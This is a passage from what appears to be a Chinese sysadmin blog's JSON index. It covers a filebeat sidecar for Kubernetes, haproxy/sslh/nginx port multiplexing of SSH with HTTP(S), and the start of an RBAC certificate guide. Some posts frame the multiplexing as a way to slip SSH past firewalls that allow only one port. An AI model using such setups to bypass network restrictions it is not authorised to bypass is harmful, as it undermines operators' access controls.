\u0026#34;tomcat-logs-%{+yyyy.MM}\u0026#34; EOF set -xe # If user don\u0026#39;t provide any command # Run filebeat if [[ \u0026#34;$1\u0026#34; == \u0026#34;\u0026#34; ]]; then exec /opt/filebeat-7.15.1-linux-x86_64/filebeat -c /etc/filebeat.yaml else # Else allow the user to run arbitrarily commands like bash exec \u0026#34;$@\u0026#34; fi 我们为什么不在 k8s 里用 configmap 来配置 filebeat.yml 呢？\n理由是收集日志文件多且路径、类型各不相同，这么一堆的配置都放在 configmap 里会让人癫狂的。所以干脆放到镜像里，便于调试也便于修改。\n上面我们也充分利用了 filebeat 的 module，有 module 可用就必须用 module，而不是手动指定 filebeat.inputs ，可用的 mudole 实在太多了，一定要善用！！！另外 tomcat 和 apache 的日志格式是一样的。\n我们在最后执行的时候，也加了 exec $@ 便于调试，如果没有指定 CMD，就启动 filebeat，如果指定了比如 /bin/bash，就进入调试状态。\n我们打好镜像就 push 到 harbor 里待用\n附录：https://www.elastic.co/guide/en/beats/filebeat/current/configuration-general-options.html filebeat的配置列表\n二、sidecar部署 我们写一个 k8s 的 tomcat deployment文件：\napiVersion: apps/v1 kind: Deployment metadata: name: tomcat labels: app: tomcat spec: replicas: 1 selector: matchLabels: app: tomcat template: metadata: labels: app: tomcat spec: containers: - name: filebeat-sidecar image: xxxx.xxxx.xxx/filebeat:xxx env: - name: POD_NAMESPACE valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.namespace - name: NODE_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: spec.nodeName - name: POD_IP valueFrom: fieldRef: apiVersion: v1 fieldPath: status.podIP - name: POD_NAME valueFrom: fieldRef: apiVersion: v1 fieldPath: metadata.name volumeMounts: - name: logs-volume mountPath: /usr/local/tomcat/logs - name: tomcat image: tomcat ports: - containerPort: 8080 volumeMounts: - name: logs-volume mountPath: /usr/local/tomcat/logs volumes: - name: logs-volume emptyDir: {} 可以看到我们在这个 deployment 里定义了 pod 是单副本，里面跑了两个 container，一个是 filebeat，一个是 tocmat，两者通过同一个 volume 连接在一起，这样就可以做到不修改 tomcat container 而拿到里面的日志了。\n这样就把 tomcat 应用的日志收到 ES 去了。\n","permalink":"https://rendoumi.com/posts/20211110-k8s_sidecar/","summary":"\u003cp\u003e在生产环境中，ES 通常是不会在 k8s 集群中存在的，一般 MySQL 和 Elasticsearch 都是独立在 k8s 之外。\u003c/p\u003e\n\u003cp\u003e那么无论哪种 pod，要甩日志到 ES，最轻量的方案肯定是用 filebeat 甩过去了。\u003c/p\u003e\n\u003cp\u003e当然，如果是阿里的 ACK，logtail 和 logstore 配搭已经非常不错了，根本用不到 filebeat 和 ES。\u003c/p\u003e\n\u003cp\u003e可但是，我们不想为阿里 sls、logstore 出钱买单，就只能用 filebeat + ES 了\u003c/p\u003e\n\u003cp\u003e说一下 filebeat 的 sidecar 边车（僚机）用法：\u003c/p\u003e\n\u003cp\u003e\u003cimg alt=\"image-20211110192939845\" loading=\"lazy\" src=\"/posts/20211110-k8s_sidecar/image-20211110192939845.png\"\u003e\u003c/p\u003e\n\u003cp\u003e如上图所示，简单说就是起一个 filebeat 的 logging-agent 边车（僚机），边车和主应用之间共享某个文件夹（mountPath），达到收集主应用日志并发送到 ES，而不用动 app-container 分毫。\u003c/p\u003e\n\u003cp\u003e我们以部署一个 Tomcat 应用为例来说明：\u003c/p\u003e\n\u003ch2 id=\"一打造-filebeat-边车镜像\"\u003e一、打造 filebeat 边车镜像\u003c/h2\u003e\n\u003cp\u003e首先准备 Dockerfile\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eFROM alpine:3.12  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eARG VERSION\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s\"\u003e7.15.1  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eCOPY docker-entrypoint.sh /  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eRUN set -x \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; cd /tmp \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; wget https://artifacts.elastic.co/downloads/beats/filebeat/filebeat-${VERSION}-linux-x86_64.tar.gz \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; tar xzvf filebeat-${VERSION}-linux-x86_64.tar.gz \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; mv filebeat-${VERSION}-linux-x86_64 /opt \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; rm /tmp/* \\  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e\u0026amp;\u0026amp; chmod +x /docker-entrypoint.sh  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENV PATH $PATH:/opt/filebeat-${VERSION}-linux-x86_64  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eWORKDIR /opt/filebeat-${VERSION}-linux-x86_64  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eENTRYPOINT [\u0026#34;/docker-entrypoint.sh\u0026#34;]  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e我们以 alphine:3.12 为底版，然后下载 filebeat  7.15.1的二进制包并释放到 /opt 下，最后指定入口文件 /docker-entrypoint.sh\u003c/p\u003e","title":"kubernetes生产环境使用filebeat sidecar收集日志"},{"content":"我们选择 haproxy 1.8 版本以上的，编译安装到路径 /export/servers/haproxy\nmake TARGET=linux2628 PREFIX=/export/servers/haproxy USE_GETADDRINFO=1 USE_ZLIB=1 USE_REGPARM=1 USE_OPENSSL=1 \\ USE_SYSTEMD=1 USE_PCRE=1 USE_PCRE_JIT=1 USE_NS=1 make install PREFIX=/export/servers/haproxy 编辑 haproxy.conf 配置文件：\nglobal maxconn 5120 chroot /export/servers/haproxy daemon quiet nbproc 2 pidfile /tmp/haproxy.pid defaults timeout connect 5s timeout client 50s timeout server 20s listen http bind :80 timeout client 1h tcp-request inspect-delay 2s acl is_http req_proto_http tcp-request content accept if is_http server server-http :8080 use_backend ssh if !is_http backend ssh mode tcp timeout server 1h server server-ssh :22 解释一下：我们在 8080 端口开了 http 服务，在 22 端口开了 ssh 服务，80端口由 haproxy 做代理转发，首先判断客户端请求是否是 http 请求，如果是就转发到 8080 端口，如果不是，就转发到 22 端口，这样就实现了 80 端口同时跑 http 和 ssh 两个服务。\n","permalink":"https://rendoumi.com/posts/20211110-haproxy_multiple_port/","summary":"\u003cp\u003e我们选择 haproxy 1.8 版本以上的，编译安装到路径 /export/servers/haproxy\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake \u003cspan class=\"nv\"\u003eTARGET\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003elinux2628 \u003cspan class=\"nv\"\u003ePREFIX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/haproxy \u003cspan class=\"nv\"\u003eUSE_GETADDRINFO\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_ZLIB\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_REGPARM\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_OPENSSL\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"se\"\u003e\\\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"se\"\u003e\u003c/span\u003e  \u003cspan class=\"nv\"\u003eUSE_SYSTEMD\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_PCRE_JIT\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e \u003cspan class=\"nv\"\u003eUSE_NS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"m\"\u003e1\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003emake install \u003cspan class=\"nv\"\u003ePREFIX\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e/export/servers/haproxy\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e编辑 haproxy.conf 配置文件：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003eglobal \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003emaxconn 5120  \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003echroot /export/servers/haproxy   \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003edaemon \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003equiet \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003enbproc 2 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003epidfile /tmp/haproxy.pid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003edefaults \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout connect 5s \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout client 50s \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout server 20s\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003elisten http \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003ebind :80 \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout client 1h \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etcp-request inspect-delay 2s \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eacl is_http req_proto_http \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etcp-request content accept if is_http \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eserver server-http :8080\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003euse_backend ssh if !is_http\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003ebackend ssh \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003emode tcp \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003etimeout server 1h \u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e  \u003cspan class=\"na\"\u003eserver server-ssh :22\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e解释一下：我们在 8080 端口开了 http 服务，在 22 端口开了 ssh 服务，80端口由 haproxy 做代理转发，首先判断客户端请求是否是 http 请求，如果是就转发到 8080 端口，如果不是，就转发到 22 端口，这样就实现了 80 端口同时跑 http 和 ssh 两个服务。\u003c/p\u003e","title":"haproxy一个端口跑多个服务"},{"content":"Ucloud的机器在两会期间干脆端口全灭，firewall设置进来的端口全关闭！！！！！！\n还好有个Global ssh的服务，可以 ssh ubuntu@111.129.37.89.ipssh.net\n登录上去，注意，直接ssh ubuntu@111.129.37.89是不通的。\n那我们就搭建一个SSLH服务，可以把ssh和openvpn以及ssl服务统统塞到一个端口22里\n动手吧\n1、修改openssh的端口 从22端口改成2222，千万别重启，22这会先得归ssh用\n2、安装sslh\nsudo apt install sslh vi /etc/default/sslh 找到Run=no 改成Run=yes 然后到下面，按需配置（不跑443的话可以不配） DAEMON_OPTS=\u0026#34;--user sslh --listen 0.0.0.0:22 --ssh 127.0.0.1:2222 --ssl 127.0.0.1:443 --openvpn 127.0.0.1:1194 --pidfile /var/run/sslh/sslh.pid --timeout 5\u0026#34; 3、配置sslh并且重启服务器\nsudo systemctl enable sslh sudo reboot 就搞定了\n","permalink":"https://rendoumi.com/posts/20211110-sslh_multiple_port/","summary":"\u003cp\u003eUcloud的机器在两会期间干脆端口全灭，firewall设置进来的端口全关闭！！！！！！\u003c/p\u003e\n\u003cp\u003e还好有个Global ssh的服务，可以 ssh \u003ca href=\"mailto:ubuntu@111.129.37.89.ipssh.net\"\u003eubuntu@111.129.37.89.ipssh.net\u003c/a\u003e\u003c/p\u003e\n\u003cp\u003e登录上去，注意，直接ssh \u003ca href=\"mailto:ubuntu@111.129.37.89\"\u003eubuntu@111.129.37.89\u003c/a\u003e是不通的。\u003c/p\u003e\n\u003cp\u003e那我们就搭建一个SSLH服务，可以把ssh和openvpn以及ssl服务统统塞到一个端口22里\u003c/p\u003e\n\u003cp\u003e动手吧\u003c/p\u003e\n\u003cp\u003e1、修改openssh的端口 从22端口改成2222，千万别重启，22这会先得归ssh用\u003c/p\u003e\n\u003cp\u003e2、安装sslh\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-bash\" data-lang=\"bash\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003esudo apt install sslh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003evi /etc/default/sslh\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e找到Run\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eno\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003e改成Run\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003eyes\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e然后到下面，按需配置（不跑443的话可以不配）\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nv\"\u003eDAEMON_OPTS\u003c/span\u003e\u003cspan class=\"o\"\u003e=\u003c/span\u003e\u003cspan class=\"s2\"\u003e\u0026#34;--user sslh --listen 0.0.0.0:22 --ssh 127.0.0.1:2222 --ssl 127.0.0.1:443 --openvpn 127.0.0.1:1194 --pidfile /var/run/sslh/sslh.pid --timeout 5\u0026#34;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e3、配置sslh并且重启服务器\u003c/p\u003e\n\u003cpre tabindex=\"0\"\u003e\u003ccode\u003esudo systemctl enable sslh\nsudo reboot\n\u003c/code\u003e\u003c/pre\u003e\u003cp\u003e就搞定了\u003c/p\u003e","title":"sslh的一个端口同时跑多个服务"},{"content":"这个要求挺古怪的，背景是防火墙只开了 nginx 443 端口。我也想同时 ssh 登录进去，但是F5没开IP\n就只能这么干了，让 Nginx 一个端口跑多个服务\n在 nginx.conf 加一段，stream 配置，nginx 的 ip 是 192.168.8.110：\n#Multi Ports stream { upstream ssh { server 192.168.8.112:22; } upstream https { server 192.168.8.111:443; } map $ssl_preread_protocol $upstream { default ssh; \u0026#34;TLSv1.2\u0026#34; https; \u0026#34;TLSv1.3\u0026#34; https; \u0026#34;TLSv1.1\u0026#34; https; \u0026#34;TLSv1.0\u0026#34; https; } # SSH and SSL on the same port server { listen 443; proxy_pass $upstream; ssl_preread on; } } 测试一下：\ncurl -v https://192.168.8.110 ssh 192.168.8.110 -p 443 这样就可以了。\n","permalink":"https://rendoumi.com/posts/20211109-nginx_multiple_port/","summary":"\u003cp\u003e这个要求挺古怪的，背景是防火墙只开了 nginx 443 端口。我也想同时 ssh 登录进去，但是F5没开IP\u003c/p\u003e\n\u003cp\u003e就只能这么干了，让 Nginx 一个端口跑多个服务\u003c/p\u003e\n\u003cp\u003e在 nginx.conf 加一段，stream 配置，nginx 的 ip 是 192.168.8.110：\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre tabindex=\"0\" class=\"chroma\"\u003e\u003ccode class=\"language-ini\" data-lang=\"ini\"\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"c1\"\u003e#Multi Ports\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003estream {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eupstream ssh {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eserver 192.168.8.112:22;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eupstream https {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eserver 192.168.8.111:443;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003emap $ssl_preread_protocol $upstream {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003edefault ssh;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.2\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.3\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.1\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003e\u0026#34;TLSv1.0\u0026#34; https;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"c1\"\u003e# SSH and SSL on the same port\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003eserver {\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003elisten 443;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003eproxy_pass $upstream;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e        \u003cspan class=\"na\"\u003essl_preread on;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e    \u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"na\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\u003cp\u003e测试一下：\u003c/p\u003e","title":"Nginx的一个端口同时跑SSH和HTTPS服务"},{"content":"kubernetes 装好正常运行一段时间后，会出现要把研发和运维权限分开的场景：\n比如：\n给某个用户某一指定名称空间下的管理权限 给用户赋予集群的只读权限 … 非常麻烦，我们这里不讨论过多的概念，从运维的角度出发，简单实用化\n我们需要明确三个RBAC最基本的概念\nRole: 角色，它定义了一组规则，定义了一组对Kubernetes API对象的操作权限 RoleBinding: 定义了\u0026quot;被作用者\u0026quot;和\u0026quot;角色\u0026quot;的绑定关系 Subject: 被作用者，既可以是\u0026quot;人\u0026quot;，也可以是机器，当然也可以是 Kubernetes 中定义的用户(ServiceAccount主要负责kubernetes内置用户) 我们的操作过程流程如下，首先创建客户端证书；其次创建Role角色；再创建RoleBinding，把Subject和Role绑定，就完事了；最后一步是生成 kubectl 的配置文件。\n一、创建客户端证书 我们以已建好的阿里 ACK 为例，或者自建好的 Kubernetes 也行；确定已经有了 .kube/config 配置文件，拥有集群最高权限，并且可以正常执行 kubectl 命令。\n首先是生成证书，并向集群提出证书请求并签发，脚本如下：\n#!/bin/sh useraccount=reader openssl req -new -newkey rsa:4096 -nodes -keyout $useraccount-k8s.key -out $useraccount-k8s.csr -subj \u0026#34;/CN=$useraccount/O=devops\u0026#34; csr=$(cat $useraccount-k8s.csr | base64 | tr -d \u0026#39;\\n\u0026#39;) cat \u0026lt;\u0026lt; EOF \u0026gt; k8s-csr.yaml apiVersion: certificates.k8s.io/v1beta1 kind: CertificateSigningRequest metadata: name: $useraccount-k8s-access spec: groups: - system:authenticated request: $csr usages: - client auth EOF kubectl create -f k8s-csr.yaml kubectl certificate approve $useraccount-k8s-access kubectl get csr $useraccount-k8s-access -o jsonpath=\u0026#39;{.status.certificate}\u0026#39; | base64 --decode \u0026gt; $useraccount-k8s-access.crt kubectl config view -o jsonpath=\u0026#39;{.clusters[0].cluster.certificate-authority-data}\u0026#39; --raw | base64 --decode - \u0026gt; k8s-ca.crt 解释一下：我们定义了一个用户CN=reader，然后向集群发送了证书请求并签发，最终从集群获得了 reader-k8s-access.crt 的客户端证书和 k8s-ca.crt 的 CA 证书。\nk8s-csr.yaml 和 reader-k8s.csr 都是中间产物，最终我们有了客户端私钥 reader-k8s.key ，客户端证书 reader-k8s-access.crt ，CA 证书 k8s-ca.crt 这三个有用的文件。\n二、创建 Role 角色 cat \u0026lt;\u0026lt; EOF \u0026gt;\u0026gt; role.yaml apiVersion: rbac.authorization.k8s.io/v1 kind: Role metadata: name: role-pods_reader namespace: default rules: - apiGroups: - \u0026#34;\u0026#34; resources: - pods - pods/log verbs: - get - list - watch EOF kubectl apply -f role.yaml 解释：我们创建了一个 role 角色，名字叫做 